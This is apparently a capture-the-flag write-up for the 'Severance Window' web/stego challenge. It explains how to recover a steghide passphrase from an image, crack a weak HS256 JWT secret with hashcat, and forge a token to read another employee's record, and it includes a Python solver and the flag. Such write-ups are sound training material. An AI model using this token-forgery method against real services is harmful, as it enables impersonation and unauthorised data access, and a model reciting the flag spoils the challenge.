# Severance Window (500) — Web / Stego

> Big O Corp replaced you with a model trained on your own articles... Recover
> your archived severance record before Big O Corp wipes the slate clean.

**Files:** `email.jpg`  ·  `http://20.244.105.226:8081`
**Flag:** `AIT{r3pl4c3d_by_3xp1r3d_jwts_4nd_h3x}`

## Vulnerability
steghide-hidden hint in `email.jpg` + a forgeable **HS256 JWT** on the portal
(weak secret `severance`), letting you re-bind the token to another employee id.

## Steps
1. `email.jpg` JPEG comment hints steghide. The email header `EMP4e6f4f644c6553`
   is **hex** → `NoOdLeS`, which is the steghide passphrase.
2. Hidden payload: *"Claim at port 5173"* — a red herring (internal/unreachable).
   The live API is the 8081 Express portal.
3. `POST /api/sandbox-login` issues an HS256 JWT bound to the guest
   `EMP4775657374` (`Guest`); `/api/packet/<id>` enforces the binding.
4. `alg:none` is rejected, but the HS256 secret cracks to **`severance`**
   (`hashcat -m 16500`, rockyou).
5. Forge a token with `emp_id = EMP4e6f4f644c6553` (`NoOdLeS`) →
   `/api/packet/EMP4e6f4f644c6553` returns the flag.

## Solver
```python
import jwt, requests
tok = jwt.encode({"emp_id":"EMP4e6f4f644c6553","role":"employee"},
                 "severance", algorithm="HS256")
r = requests.get("http://20.244.105.226:8081/api/packet/EMP4e6f4f644c6553",
                 headers={"Authorization": f"Bearer {tok}"})
print(r.text)   # -> AIT{r3pl4c3d_by_3xp1r3d_jwts_4nd_h3x}
```
